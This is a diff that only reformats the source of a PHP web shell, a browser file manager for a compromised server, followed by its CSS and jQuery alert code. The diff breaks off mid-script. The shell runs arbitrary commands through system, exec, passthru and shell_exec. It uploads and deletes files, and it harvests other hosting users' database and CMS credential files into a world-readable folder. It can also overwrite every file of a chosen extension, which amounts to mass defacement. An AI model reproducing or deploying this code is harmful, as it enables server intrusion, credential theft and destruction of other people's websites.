@@ -1,55 +1,70 @@
 <meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
 <?php
 date_default_timezone_set("Asia/Jakarta");
-class XN {
+class XN
+{
     public static $array;
     public static $owner;
     public static $uplaod;
     public static $group;
     public static $handle;
     public static $directory;
-    public static function files($type) {
-
-        self::$array = array();
+    public static function files($type)
+    {
+        self::$array = [];
         foreach (scandir(getcwd()) as $key => $value) {
             $filename['name'] = getcwd() . XN::SLES() . $value;
             switch ($type) {
                 case 'dir':
-                    if (!is_dir($filename['name']) || $value === '.' || $value === '..') continue 2;
+                    if (
+                        !is_dir($filename['name']) ||
+                        $value === '.' ||
+                        $value === '..'
+                    ) {
+                        continue 2;
+                    }
                     break;
                 case 'file':
-                    if (!is_file($filename['name'])) continue 2;
+                    if (!is_file($filename['name'])) {
+                        continue 2;
+                    }
                     break;
             }
             $filename['names'] = basename($filename['name']);
             $filename['owner'] = self::owner($filename['name']);
             $filename['ftime'] = self::ftime($filename['name']);
-            $filename['size']  = (is_dir($filename['name'])) ? self::countDir($filename['name']). " items" : 
-                                                               self::size($filename['name']);
-            
+            $filename['size'] = is_dir($filename['name'])
+                ? self::countDir($filename['name']) . " items"
+                : self::size($filename['name']);
+
             self::$array[] = $filename;
-        } return self::$array;
+        }
+        return self::$array;
     }
-    public static function save($filename, $data) {
+    public static function save($filename, $data)
+    {
         self::$handle = fopen($filename, "w");
         fwrite(self::$handle, $data);
         fclose(self::$handle);
     }
-    public static function size($filename) {
+    public static function size($filename)
+    {
         if (is_file($filename)) {
             $filepath = $filename;
             if (!realpath($filepath)) {
                 $filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
             }
             $filesize = filesize($filepath);
-            $array = array("TB","GB","MB","KB","Byte");
+            $array = ["TB", "GB", "MB", "KB", "Byte"];
             $total = count($array);
             while ($total-- && $filesize > 1024) {
                 $filesize /= 1024;
-            } return round($filesize, 2) . " " . $array[$total];
+            }
+            return round($filesize, 2) . " " . $array[$total];
         }
     }
-    public static function wr($filename, $perms, $type) {
+    public static function wr($filename, $perms, $type)
+    {
         if (is_writable($filename)) {
             switch ($type) {
                 case 1:
@@ -63,13 +78,14 @@ class XN {
             print "<font color='red'>{$perms}</font>";
         }
     }
-    public static function perms($filename) {
+    public static function perms($filename)
+    {
         $perms = @fileperms($filename);
-        switch ($perms & 0xF000) {
-            case 0xC000:
+        switch ($perms & 0xf000) {
+            case 0xc000:
                 $info = 's';
                 break;
-            case 0xA000:
+            case 0xa000:
                 $info = 'l';
                 break;
             case 0x8000:
@@ -90,33 +106,52 @@ class XN {
             default:
                 $info = 'u';
         }
-        $info .= (($perms & 0x0100) ? 'r' : '-');
-        $info .= (($perms & 0x0080) ? 'w' : '-');
-        $info .= (($perms & 0x0040) ?
-                    (($perms & 0x0800) ? 's' : 'x' ) :
-                    (($perms & 0x0800) ? 'S' : '-'));
-        $info .= (($perms & 0x0020) ? 'r' : '-');
-        $info .= (($perms & 0x0010) ? 'w' : '-');
-        $info .= (($perms & 0x0008) ?
-                    (($perms & 0x0400) ? 's' : 'x' ) :
-                    (($perms & 0x0400) ? 'S' : '-'));
-        $info .= (($perms & 0x0004) ? 'r' : '-');
-        $info .= (($perms & 0x0002) ? 'w' : '-');
-        $info .= (($perms & 0x0001) ?
-                    (($perms & 0x0200) ? 't' : 'x' ) :
-                    (($perms & 0x0200) ? 'T' : '-'));
+        $info .= $perms & 0x0100 ? 'r' : '-';
+        $info .= $perms & 0x0080 ? 'w' : '-';
+        $info .=
+            $perms & 0x0040
+                ? ($perms & 0x0800
+                    ? 's'
+                    : 'x')
+                : ($perms & 0x0800
+                    ? 'S'
+                    : '-');
+        $info .= $perms & 0x0020 ? 'r' : '-';
+        $info .= $perms & 0x0010 ? 'w' : '-';
+        $info .=
+            $perms & 0x0008
+                ? ($perms & 0x0400
+                    ? 's'
+                    : 'x')
+                : ($perms & 0x0400
+                    ? 'S'
+                    : '-');
+        $info .= $perms & 0x0004 ? 'r' : '-';
+        $info .= $perms & 0x0002 ? 'w' : '-';
+        $info .=
+            $perms & 0x0001
+                ? ($perms & 0x0200
+                    ? 't'
+                    : 'x')
+                : ($perms & 0x0200
+                    ? 'T'
+                    : '-');
         return $info;
     }
-    public static function OS() {
-        return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
+    public static function OS()
+    {
+        return substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
     }
-    public static function getext($filename) {
+    public static function getext($filename)
+    {
         return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
     }
-    public static function vers($x) {
-        return print($x);
+    public static function vers($x)
+    {
+        return print $x;
     }
-    public static function geticon($filename) {
+    public static function geticon($filename)
+    {
         switch (self::getext($filename)) {
             case 'php1':
             case 'php2':
@@ -126,149 +161,240 @@ class XN {
             case 'php6':
             case 'phtml':
             case 'php':
-                self::vers('https://image.flaticon.com/icons/svg/337/337947.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/337/337947.svg'
+                );
                 break;
             case 'html':
             case 'htm':
-                self::vers('https://image.flaticon.com/icons/svg/337/337937.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/337/337937.svg'
+                );
                 break;
             case 'css':
-                self::vers('https://image.flaticon.com/icons/svg/136/136527.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/136/136527.svg'
+                );
                 break;
             case 'js':
-                self::vers('https://image.flaticon.com/icons/svg/337/337941.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/337/337941.svg'
+                );
                 break;
             case 'json':
-                self::vers('https://image.flaticon.com/icons/svg/136/136525.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/136/136525.svg'
+                );
                 break;
             case 'xml':
-                self::vers('https://image.flaticon.com/icons/svg/337/337959.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/337/337959.svg'
+                );
                 break;
             case 'py':
-                self::vers('https://image.flaticon.com/icons/svg/617/617531.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/617/617531.svg'
+                );
                 break;
             case 'zip':
-                self::vers('https://image.flaticon.com/icons/svg/2306/2306214.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/2306/2306214.svg'
+                );
                 break;
             case 'rar':
-                self::vers('https://image.flaticon.com/icons/svg/2306/2306170.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/2306/2306170.svg'
+                );
                 break;
             case 'htaccess':
-                self::vers('https://image.flaticon.com/icons/png/128/1720/1720444.png');
+                self::vers(
+                    'https://image.flaticon.com/icons/png/128/1720/1720444.png'
+                );
                 break;
             case 'txt':
-                self::vers('https://image.flaticon.com/icons/svg/136/136538.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/136/136538.svg'
+                );
                 break;
             case 'ini':
-                self::vers('https://image.flaticon.com/icons/svg/1126/1126890.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/1126/1126890.svg'
+                );
                 break;
             case 'mp3':
-                self::vers('https://image.flaticon.com/icons/svg/337/337944.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/337/337944.svg'
+                );
                 break;
             case 'mp4':
-                self::vers('https://image.flaticon.com/icons/svg/2306/2306142.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/2306/2306142.svg'
+                );
                 break;
             case 'log':
             case 'log1':
             case 'log2':
-                self::vers('https://image.flaticon.com/icons/svg/2306/2306124.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/2306/2306124.svg'
+                );
                 break;
             case 'dat':
-                self::vers('https://image.flaticon.com/icons/svg/2306/2306050.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/2306/2306050.svg'
+                );
                 break;
             case 'exe':
-                self::vers('https://image.flaticon.com/icons/svg/136/136531.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/136/136531.svg'
+                );
                 break;
             case 'apk':
-                self::vers('https://1.bp.blogspot.com/-HZGGTdD2niI/U2KlyCpOVnI/AAAAAAAABzI/bavDJBFSo-Q/s1600/apk-icon.jpg');
+                self::vers(
+                    'https://1.bp.blogspot.com/-HZGGTdD2niI/U2KlyCpOVnI/AAAAAAAABzI/bavDJBFSo-Q/s1600/apk-icon.jpg'
+                );
                 break;
             case 'yaml':
-                self::vers('https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png');
+                self::vers(
+                    'https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png'
+                );
                 break;
             case 'bak':
-                self::vers('https://image.flaticon.com/icons/svg/2125/2125736.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/2125/2125736.svg'
+                );
                 break;
             case 'ico':
-                self::vers('https://image.flaticon.com/icons/svg/1126/1126873.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/1126/1126873.svg'
+                );
                 break;
             case 'png':
-                self::vers('https://image.flaticon.com/icons/svg/337/337948.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/337/337948.svg'
+                );
                 break;
             case 'jpg':
             case 'jpeg':
             case 'webp':
-                self::vers('https://image.flaticon.com/icons/svg/337/337940.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/337/337940.svg'
+                );
                 break;
             case 'svg':
-                self::vers('https://image.flaticon.com/icons/svg/337/337954.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/337/337954.svg'
+                );
                 break;
             case 'gif':
-                self::vers('https://image.flaticon.com/icons/svg/337/337936.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/337/337936.svg'
+                );
                 break;
             case 'pdf':
-                self::vers('https://image.flaticon.com/icons/svg/337/337946.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/337/337946.svg'
+                );
                 break;
             default:
-                self::vers('https://image.flaticon.com/icons/svg/833/833524.svg');
+                self::vers(
+                    'https://image.flaticon.com/icons/svg/833/833524.svg'
+                );
                 break;
         }
     }
-    public static function SLES() {
+    public static function SLES()
+    {
         if (self::OS() == 'Windows') {
             return str_replace('\\', '/', DIRECTORY_SEPARATOR);
         } elseif (self::OS() == 'Linux') {
             return DIRECTORY_SEPARATOR;
         }
     }
-    public static function exe($cmd) {
-        if(function_exists('system')) {         
-            @ob_start();        
-            @system($cmd);      
-            $buff = @ob_get_contents();         
-            @ob_end_clean();        
-            return $buff;   
-        } elseif(function_exists('exec')) {         
-            @exec($cmd,$results);       
-            $buff = "";         
-            foreach($results as $result) {          
-                $buff .= $result;       
-            } return $buff;     
-        } elseif(function_exists('passthru')) {         
-            @ob_start();        
-            @passthru($cmd);        
-            $buff = @ob_get_contents();         
-            @ob_end_clean();        
-            return $buff;   
-        } elseif(function_exists('shell_exec')) {       
-            $buff = @shell_exec($cmd);      
-            return $buff;   
-        } 
+    public static function exe($cmd)
+    {
+        if (function_exists('system')) {
+            @ob_start();
+            @system($cmd);
+            $buff = @ob_get_contents();
+            @ob_end_clean();
+            return $buff;
+        } elseif (function_exists('exec')) {
+            @exec($cmd, $results);
+            $buff = "";
+            foreach ($results as $result) {
+                $buff .= $result;
+            }
+            return $buff;
+        } elseif (function_exists('passthru')) {
+            @ob_start();
+            @passthru($cmd);
+            $buff = @ob_get_contents();
+            @ob_end_clean();
+            return $buff;
+        } elseif (function_exists('shell_exec')) {
+            $buff = @shell_exec($cmd);
+            return $buff;
+        }
     }
-    public static function color($bold = 1, $colorid = null, $string = null) {
-        $color = array(
-            "</font>",              # 0 off
-            "<font color='red'>",   # 1 red 
-            "<font color='lime'>",  # 2 lime
+    public static function color($bold = 1, $colorid = null, $string = null)
+    {
+        $color = [
+            "</font>", # 0 off
+            "<font color='red'>", # 1 red
+            "<font color='lime'>", # 2 lime
             "<font color='white'>", # 3 white
-            "<font color='gold'>",  # 4 gold
-        );  return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
+            "<font color='gold'>", # 4 gold
+        ];
+        return $string !== null
+            ? $color[$colorid] . $string . $color[0]
+            : $color[$colorid];
     }
-    public static function lib_installed() {
-        $lib[] = "MySQL: ".(function_exists('mysql_connect') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
-        $lib[] = "cURL:  ".(function_exists('curl_version') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
-        $lib[] = "Wget:  ".(self::exe('wget --help') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
-        $lib[] = "Perl:  ".(self::exe('perl --help') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
-        $lib[] = "Mail:  ".(function_exists('mail') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
-        $lib[] = "Python: ".(self::exe('python --help') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
+    public static function lib_installed()
+    {
+        $lib[] =
+            "MySQL: " .
+            (function_exists('mysql_connect')
+                ? self::color(1, 2, "ON")
+                : self::color(1, 1, "OFF"));
+        $lib[] =
+            "cURL:  " .
+            (function_exists('curl_version')
+                ? self::color(1, 2, "ON")
+                : self::color(1, 1, "OFF"));
+        $lib[] =
+            "Wget:  " .
+            (self::exe('wget --help')
+                ? self::color(1, 2, "ON")
+                : self::color(1, 1, "OFF"));
+        $lib[] =
+            "Perl:  " .
+            (self::exe('perl --help')
+                ? self::color(1, 2, "ON")
+                : self::color(1, 1, "OFF"));
+        $lib[] =
+            "Mail:  " .
+            (function_exists('mail')
+                ? self::color(1, 2, "ON")
+                : self::color(1, 1, "OFF"));
+        $lib[] =
+            "Python: " .
+            (self::exe('python --help')
+                ? self::color(1, 2, "ON")
+                : self::color(1, 1, "OFF"));
         return implode(" | ", $lib);
     }
-    public static function info($info = null) {
+    public static function info($info = null)
+    {
         switch ($info) {
             case 'disable_function':
-                return (!empty(@ini_get("disable_functions"))) ? @ini_get("disable_functions") : "<font color=green>NONE</font>";
+                return !empty(@ini_get("disable_functions"))
+                    ? @ini_get("disable_functions")
+                    : "<font color=green>NONE</font>";
                 break;
             case 'mysql':
-                return (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
+                return function_exists('mysql_connect')
+                    ? "<font color=green>ON</font>"
+                    : "<font color=red>OFF</font>";
                 break;
             case 'ip':
                 return getHostByName(getHostName());
@@ -283,35 +409,37 @@ class XN {
                 return phpversion();
                 break;
             case 'safe_mode':
-                return (@ini_get(strtoupper("safe_mode")) === "ON" ? "<font color='red'>ON</font>" : 
-                                            "<font color='green'>OFF</font>");
+                return @ini_get(strtoupper("safe_mode")) === "ON"
+                    ? "<font color='red'>ON</font>"
+                    : "<font color='green'>OFF</font>";
                 break;
             case 'lib':
                 return self::lib_installed();
                 break;
             case 'domain':
                 $d0mains = @file("/etc/named.conf", false);
-                if (!$d0mains){
+                if (!$d0mains) {
                     print "<font color=red size=2px>Cant Read <i>/etc/named.conf</i></font>";
                     $GLOBALS["need_to_update_header"] = "true";
                 } else {
                     $count = 0;
-                    foreach ($d0mains as $d0main){
-                        if (@strstr($d0main, "zone")){
+                    foreach ($d0mains as $d0main) {
+                        if (@strstr($d0main, "zone")) {
                             preg_match_all('#zone "(.*)"#', $d0main, $domains);
                             flush();
-                            if (strlen(trim($domains[1][0])) > 2){
+                            if (strlen(trim($domains[1][0])) > 2) {
                                 flush();
                                 $count++;
                             }
                         }
                     }
-                    print $count. " Domain";
+                    print $count . " Domain";
                 }
-            break;
+                break;
         }
     }
-    public static function addFile($filename, $data) {
+    public static function addFile($filename, $data)
+    {
         foreach ($filename as $value) {
             $handle = fopen($value, "w");
             if (fwrite($handle, $data)) {
@@ -321,21 +449,24 @@ class XN {
             }
         }
     }
-    public static function addfolder($path, $mode = 0777) {
-        return (!is_dir($path) && (!mkdir($path, $mode)));
+    public static function addfolder($path, $mode = 0777)
+    {
+        return !is_dir($path) && !mkdir($path, $mode);
     }
-    public static function delete($filename) {
+    public static function delete($filename)
+    {
         if (is_dir($filename)) {
             $scandir = scandir($filename);
             foreach ($scandir as $object) {
                 if ($object != '.' && $object != '..') {
-                    if (is_dir($filename.DIRECTORY_SEPARATOR.$object)) {
-                        self::delete($filename.DIRECTORY_SEPARATOR.$object);
+                    if (is_dir($filename . DIRECTORY_SEPARATOR . $object)) {
+                        self::delete($filename . DIRECTORY_SEPARATOR . $object);
                     } else {
-                        @unlink($filename.DIRECTORY_SEPARATOR.$object);
+                        @unlink($filename . DIRECTORY_SEPARATOR . $object);
                     }
                 }
-            } if (@rmdir($filename)) {
+            }
+            if (@rmdir($filename)) {
                 return true;
             } else {
                 return false;
@@ -348,7 +479,8 @@ class XN {
             }
         }
     }
-    public static function owner($filename) {
+    public static function owner($filename)
+    {
         if (function_exists("posix_getpwuid")) {
             self::$owner = @posix_getpwuid(fileowner($filename));
             self::$owner = self::$owner['name'];
@@ -360,42 +492,60 @@ class XN {
             self::$group = self::$group['name'];
         } else {
             self::$group = filegroup($filename);
-        } return (self::$owner."<span class='group'>/".self::$group."</span>");
+        }
+        return self::$owner .
+            "<span class='group'>/" .
+            self::$group .
+            "</span>";
     }
-    public static function ftime($filename) {
+    public static function ftime($filename)
+    {
         return date('d M Y - H:i A', @filemtime($filename));
     }
-    public static function renames($filename, $newname) {
+    public static function renames($filename, $newname)
+    {
         return rename($filename, $newname);
     }
-    public static function cd($directory) {
+    public static function cd($directory)
+    {
         return @chdir($directory);
     }
-    public static function countDir($filename) {
-        return @count(scandir($filename)) -2;
+    public static function countDir($filename)
+    {
+        return @count(scandir($filename)) - 2;
     }
-    public static function upload($filename) {
+    public static function upload($filename)
+    {
         $files = count($filename['tmp_name']);
-        for ($i=1; $i < $files ; $i++) { 
-            if (move_uploaded_file ($filename['tmp_name'][$i], getcwd(). DIRECTORY_SEPARATOR .$filename['name'][$i])) {
-                alert($i. " File Uploaded");
+        for ($i = 1; $i < $files; $i++) {
+            if (
+                move_uploaded_file(
+                    $filename['tmp_name'][$i],
+                    getcwd() . DIRECTORY_SEPARATOR . $filename['name'][$i]
+                )
+            ) {
+                alert($i . " File Uploaded");
             } else {
                 alert("Upload Failed/Permission Danied");
             }
         }
     }
-    public static function listFile($dir, &$output = array()) {
-        foreach (scandir($dir) as $key => $value) {
-            $location = $dir.DIRECTORY_SEPARATOR.$value;
+    public static function listFile($dir, &$output = [])
+    {
+        $dirs = scandir($dir);
+        foreach ($dirs as $key => $value) {
+            $location = $dir . DIRECTORY_SEPARATOR . $value;
             if (!is_dir($location)) {
                 $output[] = $location;
             } elseif ($value != "." && $value != '..') {
                 self::listFile($location, $output);
                 $output[] = $location;
             }
-        } return $output;
+        }
+        return $output;
     }
-    public static function adminer($url, $data) {
+    public static function adminer($url, $data)
+    {
         $handle = fopen($data, "w");
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
@@ -409,7 +559,8 @@ class XN {
         ob_flush();
         flush();
     }
-    public static function config($passwd) {
+    public static function config($passwd)
+    {
         mkdir('.config', 0777);
         $htaccess = 'Options allnRequire NonenSatisfy Any';
         $handle = fopen('.config/.htaccess', "w");
@@ -418,7 +569,7 @@ class XN {
         foreach ($matches[1] as $user) {
             $user_config = '/home/$user/public_html/';
             if (is_readable($user_config)) {
-                $grab_config = array(
+                $grab_config = [
                     "/home/$user/.my.cnf" => "cpanel",
                     "/home/$user/public_html/config/koneksi.php" => "Lokomedia",
                     "/home/$user/public_html/forum/config.php" => "phpBB",
@@ -606,75 +757,91 @@ class XN {
                     "/home/$user/public_html/billings/includes/iso4217.php" => "Hostbills",
                     "/home/$user/public_html/my/includes/iso4217.php" => "Hostbills",
                     "/home/$user/public_html/secure/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/support/order/includes/iso4217.php" => "Hostbills");
+                    "/home/$user/public_html/support/order/includes/iso4217.php" => "Hostbills",
+                ];
             }
             foreach ($grab_config as $config => $config_name) {
                 $get_config = file_get_contents($config);
                 if ($get_config == '') {
                 } else {
-                    $file_config = fopen(".config/".$user."-".$config_name.".txt", 'w');
+                    $file_config = fopen(
+                        ".config/" . $user . "-" . $config_name . ".txt",
+                        'w'
+                    );
                     fputs($file_config, $get_config);
                 }
             }
         }
     }
-    public static function rewrite($dir, $extension, $text) {
+    public static function rewrite($dir, $extension, $text)
+    {
         if (is_writable($dir)) {
             foreach (self::listFile($dir) as $key => $value) {
                 switch (self::getext($value)) {
                     case $extension:
-                        if (preg_match('/'.basename($value)."$/i", $_SERVER['PHP_SELF'], $matches) == 0) {
-                            if (file_put_contents($value, $text)) {
-                                ?>
+                        if (
+                            preg_match(
+                                '/' . basename($value) . "$/i",
+                                $_SERVER['PHP_SELF'],
+                                $matches
+                            ) == 0
+                        ) {
+                            if (file_put_contents($value, $text)) { ?>
                                 <div class="rewrite-success">
                                     <?= $value ?>
                                 </div>
-                                <?php
-                            } else {
-                                if (is_readable($value)) {
-                                ?>
+                                <?php } else {if (is_readable($value)) { ?>
                                 <div class="rewrite-failed">
                                     <?= $value ?>
                                 </div>
-                                <?php
-                            }
+                                <?php }}
                         }
-                    }
-                    break;
+                        break;
                 }
             }
         }
     }
-    public static function replace($filename) {
-        return str_replace(array(' ', '.', ':', '-' , '(', ')'), '', $filename);
+    public static function replace($filename)
+    {
+        return str_replace([' ', '.', ':', '-', '(', ')'], '', $filename);
     }
-    public static function formatSize( $bytes ){
-        $types = array( 'Byte', 'KB', 'MB', 'GB', 'TB' );
-        for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
-            return( round( $bytes, 2 )." ".$types[$i] );
+    public static function formatSize($bytes)
+    {
+        $types = ['Byte', 'KB', 'MB', 'GB', 'TB'];
+        for (
+            $i = 0;
+            $bytes >= 1024 && $i < count($types) - 1;
+            $bytes /= 1024, $i++
+        );
+        return round($bytes, 2) . " " . $types[$i];
     }
-    public static function hdd($type = null) {
+    public static function hdd($type = null)
+    {
         switch ($type) {
             case 'free':
-                return self::formatSize(disk_free_space($_SERVER['DOCUMENT_ROOT']));
+                return self::formatSize(
+                    disk_free_space($_SERVER['DOCUMENT_ROOT'])
+                );
                 break;
             case 'total':
-                return self::formatSize(disk_total_space($_SERVER['DOCUMENT_ROOT']));
+                return self::formatSize(
+                    disk_total_space($_SERVER['DOCUMENT_ROOT'])
+                );
                 break;
             case 'used':
                 $free = disk_free_space($_SERVER['DOCUMENT_ROOT']);
                 $total = disk_total_space($_SERVER['DOCUMENT_ROOT']);
-                $used = $total-$free;
+                $used = $total - $free;
                 return self::formatSize($used);
                 break;
         }
-        
     }
-    public static function countAllFiles($directory) {
-        self::$array = array();
+    public static function countAllFiles($directory)
+    {
+        self::$array = [];
         self::$directory = opendir($directory);
         while ($object = readdir(self::$directory)) {
-            if (($object != '.') && ($object != '..')) {
+            if ($object != '.' && $object != '..') {
                 $files[] = $object;
             }
         }
@@ -682,17 +849,19 @@ class XN {
         if ($numFile) {
             return $numFile;
         } else {
-            print('<i>no files</i>');
+            print '<i>no files</i>';
         }
     }
 }
 if (isset($_GET['x'])) {
     XN::cd($_GET['x']);
 }
-function search() {
+function search()
+{
     ?> <input type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name"> <?php
 }
-function head($x, $y, $class = null) {
+function head($x, $y, $class = null)
+{
     ?>
     <div class="back">
         <a href="?x=<?= $y ?>">
@@ -717,7 +886,9 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
-                    <button onclick="location.href='?x=<?= $_SERVER['DOCUMENT_ROOT'] ?>'" type="button">
+                    <button onclick="location.href='?x=<?= $_SERVER[
+                        'DOCUMENT_ROOT'
+                    ] ?>'" type="button">
                         <div class="icon">
                             <a><i class="fas fa-reply-all"></i></a>
                         </div>
@@ -787,8 +958,8 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
-                    <button type="button" onclick="$(document).ready(function () {  
-                        jqxAlert.alert('maintenance');  
+                    <button type="button" onclick="$(document).ready(function () {
+                        jqxAlert.alert('maintenance');
                     })">
                         <div class="icon">
                             <a><i class="fas fa-bug"></i></a>
@@ -799,8 +970,8 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
-                    <button type="button" onclick="$(document).ready(function () {  
-                        jqxAlert.alert('maintenance');  
+                    <button type="button" onclick="$(document).ready(function () {
+                        jqxAlert.alert('maintenance');
                     })">
                         <div class="icon">
                             <a><i class="fas fa-clone"></i></a>
@@ -821,8 +992,8 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
-                    <button type="button" onclick="$(document).ready(function () {  
-                        jqxAlert.alert('maintenance');  
+                    <button type="button" onclick="$(document).ready(function () {
+                        jqxAlert.alert('maintenance');
                     })">
                         <div class="icon">
                             <a><i class="fa fa-info-circle" aria-hidden="true"></i></a>
@@ -851,13 +1022,14 @@ function head($x, $y, $class = null) {
     </div>
     <?php
 }
-function alert($message) {
+function alert($message)
+{
     ?>
-    <script type="text/javascript">  
-        $(document).ready(function () {  
-            jqxAlert.alert('<?= $message ?>');  
-        })  
-   </script>  
+    <script type="text/javascript">
+        $(document).ready(function () {
+            jqxAlert.alert('<?= $message ?>');
+        })
+   </script>
     <?php
 }
 ?>
@@ -876,7 +1048,7 @@ function alert($message) {
     }
     .count {
         font-size:10px;
-        
+
         z-index: 99999;
         text-align: center;
         padding:10px;
@@ -884,7 +1056,7 @@ function alert($message) {
     }
     .count span {
         font-family: 'Open Sans', sans-serif;
-        
+
     }
     .count select {
         padding:7px;
@@ -1374,42 +1546,42 @@ function alert($message) {
     ::-webkit-scrollbar-thumb:hover {
         background: #dfeaf5;
     }
-    .jqx-alert  {  
+    .jqx-alert  {
         margin-top: -200px;
         position: absolute;
-        overflow: hidden;  
+        overflow: hidden;
         border-radius:10px;
         box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
         z-index: 99999;
-     }  
-    .jqx-alert-header   {  
+     }
+    .jqx-alert-header   {
         font-weight: bold;
         min-width:300px;
         outline: none;
         border-radius:10px 10px 0px 0px;
-        overflow: hidden;  
+        overflow: hidden;
         padding: 10px;
-        padding-left:20px; 
+        padding-left:20px;
         font-size:25px;
-        white-space: nowrap;  
-        overflow: hidden;  
-        background-color:#fff;   
-    }   
-    .jqx-alert-content   {  
+        white-space: nowrap;
+        overflow: hidden;
+        background-color:#fff;
+    }
+    .jqx-alert-content   {
         border-radius:0px 0px 10px 10px;
-        outline: none;  
+        outline: none;
         height:100px;
         overflow: auto;
         height:auto;
         max-width:300px;
-        text-align: left; 
+        text-align: left;
         background-color: #fff;
         word-break: break-all;
-        padding: 20px;  
+        padding: 20px;
         padding-top:10px;
-        border: 1px solid #fff;  
-        border-top: none;  
-    }  
+        border: 1px solid #fff;
+        border-top: none;
+    }
     #alert_button {
         font-weight: bold;
         color: #292929;
@@ -1493,7 +1665,7 @@ function alert($message) {
         border-radius: 7px;
         width:100%;
     }
-    .modal a.close-modal { 
+    .modal a.close-modal {
         position:absolute;
         top:-12.5px;
         right:-12.5px;
@@ -1520,7 +1692,7 @@ function alert($message) {
         outline: none;
         cursor: pointer;
         transition: all 0.3s ease-in-out;
-    } 
+    }
     .close:hover {
         background-color: #F08;
         color: #FFF;
@@ -1685,77 +1857,77 @@ function filterTable() {
      });
  });
 </script>
-<script type="text/javascript">  
-    jqxAlert = {  
-        top: 0,  
-        left: 0,  
-        overlayOpacity: 0.2,  
-        overlayColor: 'rgba(0, 0, 0, 0.3)',  
-        alert: function (message, title) {  
-            if (title == null) title = 'Alert !';  
-            jqxAlert._show(title, message);  
+<script type="text/javascript">
+    jqxAlert = {
+        top: 0,
+        left: 0,
+        overlayOpacity: 0.2,
+        overlayColor: 'rgba(0, 0, 0, 0.3)',
+        alert: function (message, title) {
+            if (title == null) title = 'Alert !';
+            jqxAlert._show(title, message);
         },
-        _show: function (title, msg) {  
-            jqxAlert._hide();  
-            jqxAlert._handleOverlay('show');  
-            $("BODY").append(  
-                      '<div class="jqx-alert" id="alert_container">' +  
-                      '<div id="alert_title"></div>' +  
-                      '<div id="alert_content">' +  
-                      '<div id="message"></div>' +  
-                      '<input type="button" value="OK" id="alert_button"/>' +  
-                      '</div>' +  
-                      '</div>');  
-            $("#alert_title").text(title);  
-            $("#alert_title").addClass('jqx-alert-header');  
-            $("#alert_content").addClass('jqx-alert-content');  
-            $("#message").text(msg);   
-            $("#alert_button").click(function () {  
-                jqxAlert._hide();  
-            });  
-            jqxAlert._setPosition();  
-        },  
-        _hide: function () {  
-            $("#alert_container").remove();  
-            jqxAlert._handleOverlay('hide');  
-        },  
-        _handleOverlay: function (status) {  
-            switch (status) {  
-                case 'show':  
-                jqxAlert._handleOverlay('hide');  
-                $("BODY").append('<div id="alert_overlay"></div>');  
-                $("#alert_overlay").css({  
-                    position: 'absolute',  
-                    zIndex: 99998,  
-                    top: '0px',  
-                    left: '0px',  
-                    width: '100%',  
-                    height: $(document).height(),  
-                    background: jqxAlert.overlayColor,  
-                    opacity: jqxAlert.overlayOpacity  
-                });  
-                break;  
-           case 'hide':  
-                $("#alert_overlay").remove();  
-                break;  
-            }  
-        },  
-        _setPosition: function () {  
-            var top = (($(window).height() / 2) - ($("#alert_container").outerHeight() / 2)) + jqxAlert.top;  
-            var left = (($(window).width() / 2) - ($("#alert_container").outerWidth() / 2)) + jqxAlert.left;  
-            if (top < 0) {  
-                top = 0;  
-            }  
-            if (left < 0) {  
-                left = 0;  
-            }  
-            $("#alert_container").css({  
-                top: top + 'px',  
-                left: left + 'px'  
-            });  
-            $("#alert_overlay").height($(document).height());  
-        }  
-    }  
+        _show: function (title, msg) {
+            jqxAlert._hide();
+            jqxAlert._handleOverlay('show');
+            $("BODY").append(
